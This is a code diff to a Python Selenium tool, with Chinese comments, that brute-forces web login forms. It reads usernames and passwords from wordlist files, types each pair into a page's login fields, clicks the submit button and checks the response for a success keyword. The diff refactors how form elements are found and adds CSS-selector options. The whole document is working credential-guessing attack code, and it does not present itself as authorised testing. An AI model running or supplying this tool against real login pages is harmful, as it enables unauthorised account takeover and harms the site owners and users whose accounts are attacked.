@@ -70,10 +70,28 @@ def SetBrowser(proxy=None, user_agent=None, user_dir=None, chrome_path=None, dri
     return browser
 
 
+def browser_get_elem(moudle, browser, elem_find_dict):
+    if elem_find_dict["find_element_by_id"] != None:
+        elem = browser.find_element_by_id(elem_find_dict["find_element_by_id"])
+    elif elem_find_dict["find_element_by_name"] is not None:
+        elem = browser.find_element_by_name(elem_find_dict["find_element_by_name"])
+    elif elem_find_dict["find_element_by_class_name"] is not None:
+        elem = browser.find_element_by_class_name(elem_find_dict["find_element_by_class_name"])
+    elif elem_find_dict["find_element_by_css_selector"] is not None:
+        elem = browser.find_element_by_css_selector(elem_find_dict["find_element_by_css_selector"])
+    else:
+        elem = None
+        print('No {} elem, browser.quit and sys.exit!!!'.format(moudle))
+        browser.quit()
+        sys.exit()
+    return elem
+
+
 def BruteLogin(user=None, pwd=None, login_url=None, time_1=1, time_2=1,
-               user_id=None, user_class=None, user_name=None,
-               pass_id=None, pass_class=None, pass_name=None,
-               button_id=None, button_class=None, button_name=None, keyword='success'):
+               user_id=None, user_class=None, user_name=None,user_css_selector=None,
+               pass_id=None, pass_class=None, pass_name=None,pass_css_selector=None,
+               button_id=None, button_class=None, button_name=None,button_css_selector=None,
+               keyword='success'):
     try:
         action = action_chains.ActionChains(browser)
         browser.get(login_url)
@@ -84,43 +102,41 @@ def BruteLogin(user=None, pwd=None, login_url=None, time_1=1, time_2=1,
         # browser.refresh() # 刷新方法 refresh
         # browser.implicitly_wait(5) #implicitly_wait 隐式等待
 
-        if user_id != None:
-            elem = browser.find_element_by_id(user_id)
-        elif user_name != None:
-            elem = browser.find_element_by_name(user_name)
-        elif user_class != None:
-            elem = browser.find_element_by_class_name(user_class)
-        else:
-            print('No Username elem')
-            browser.quit()
-        # 填充账号
-        elem.send_keys(user)
-        action.perform()
+        moudle = 'Username'
+        elem_find_dict = {'find_element_by_id': user_id,
+                          'find_element_by_name': user_name,
+                          'find_element_by_class_name': user_class,
+                          'find_element_by_css_selector': user_css_selector
+                          }
+        elem = browser_get_elem(moudle, browser, elem_find_dict)
 
-        if pass_id != None:
-            elem = browser.find_element_by_id(pass_id)
-        elif pass_name is not None:
-            elem = browser.find_element_by_name(pass_name)
-        elif pass_class is not None:
-            elem = browser.find_element_by_class_name(pass_class)
-        else:
-            print('No Password elem')
-            browser.quit()
-        # 填充密码
-        elem.send_keys(pwd)
-        action.perform()
+        if elem:
+            # 填充账号
+            elem.send_keys(user)
+            action.perform()
 
-        if button_id is not None:
-            elem = browser.find_element_by_id(button_id)
-        elif button_name is not None:
-            elem = browser.find_element_by_name(button_name)
-        elif button_class is not None:
-            elem = browser.find_element_by_class_name(button_class)
-        else:
-            print('No Password elem')
-            browser.quit()
-        # 点击按钮
-        elem.click()
+        moudle = 'Password'
+        elem_find_dict = {'find_element_by_id': pass_id,
+                          'find_element_by_name': pass_name,
+                          'find_element_by_class_name': pass_class,
+                          'find_element_by_css_selector': pass_css_selector
+                          }
+        elem = browser_get_elem(moudle, browser, elem_find_dict)
+        if elem:
+            # 填充密码
+            elem.send_keys(pwd)
+            action.perform()
+
+        module = 'Button'
+        elem_find_dict = {'find_element_by_id': button_id,
+                          'find_element_by_name': button_name,
+                          'find_element_by_class_name': button_class,
+                          'find_element_by_css_selector': button_css_selector
+                          }
+        elem = browser_get_elem(module, browser, elem_find_dict)
+        if elem:
+            # 点击按钮
+            elem.click()
 
         # 等待加载完成
         time.sleep(time_2)  # Explicit Waits 显示等待
@@ -165,9 +181,9 @@ def BruteLogin(user=None, pwd=None, login_url=None, time_1=1, time_2=1,
 
 
 def BatchBruteLogin(login_url=None, time_1=1, time_2=1,
-                    user_id=None, user_class=None, user_name=None,
-                    pass_id=None, pass_class=None, pass_name=None,
-                    button_id=None, button_class=None, button_name=None,
+                    user_id=None, user_name=None,user_class=None,user_css_selector=None,
+                    pass_id=None, pass_name=None, pass_class=None,pass_css_selector=None,
+                    button_id=None,button_name=None, button_class=None,button_css_selector=None,
                     user_dict='username.txt', pass_dict='password.txt', keyword='success'):
     with open(user_dict, 'r', ) as fuser:
         for user in fuser.readlines():
@@ -177,9 +193,10 @@ def BatchBruteLogin(login_url=None, time_1=1, time_2=1,
                     pwd = pwd.strip()
                     print('[*] 开始测试: {},{}'.format(user, pwd))
                     BruteLogin(user=user, pwd=pwd, login_url=login_url, time_1=time_1, time_2=time_2,
-                               user_id=user_id, user_class=user_class, user_name=user_name,
-                               pass_id=pass_id, pass_class=pass_class, pass_name=pass_name,
-                               button_id=button_id, button_class=button_class, button_name=button_name, keyword=keyword)
+                               user_id=user_id, user_name=user_name, user_class=user_class, user_css_selector=user_css_selector,
+                               pass_id=pass_id, pass_name=pass_name, pass_class=pass_class, pass_css_selector=pass_css_selector,
+                               button_id=button_id, button_name=button_name, button_class=button_class, button_css_selector=button_css_selector,
+                               keyword=keyword)
 
 
 if __name__ == '__main__':
@@ -209,9 +226,9 @@ if __name__ == '__main__':
     try:
         # 开始进行批量爆破
         BatchBruteLogin(login_url=config.login_url, time_1=config.time_1, time_2=config.time_2,
-                        user_id=config.user_id, user_class=config.user_class, user_name=config.user_name,
-                        pass_id=config.pass_id, pass_class=config.pass_class, pass_name=config.pass_name,
-                        button_id=config.button_id, button_class=config.button_class, button_name=config.button_name,
+                        user_id=config.user_id, user_class=config.user_class, user_name=config.user_name,user_css_selector=config.user_css_selector,
+                        pass_id=config.pass_id, pass_class=config.pass_class, pass_name=config.pass_name,pass_css_selector=config.pass_css_selector,
+                        button_id=config.button_id, button_class=config.button_class, button_name=config.button_name, button_css_selector=config.button_css_selector,
                         user_dict=config.user_dict, pass_dict=config.pass_dict, keyword=config.keyword)
     except Exception as error:
         print("[!] 注意:爆破模块发生错误,错误内容：{}".format(error))
